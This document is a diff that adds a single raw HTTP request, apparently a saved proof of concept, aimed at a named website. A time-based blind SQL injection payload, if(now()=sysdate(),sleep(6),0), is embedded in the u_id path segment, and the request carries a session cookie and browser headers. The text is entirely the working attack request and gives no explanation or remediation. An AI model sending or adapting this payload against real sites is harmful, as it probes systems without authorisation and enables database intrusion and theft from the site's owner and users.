@@ -1,0 +1,8 @@
+GET /index/my/guanzhu_list/s/3/u_id/391if(now()=sysdate(),sleep(6),0)/type/2 HTTP/1.1
+Host: zkkyjy.cn
+X-Requested-With: XMLHttpRequest
+Referer: https://zkkyjy.cn/
+Cookie: PHPSESSID=f2osop3q3i6sf688pvuumm8r9n
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+
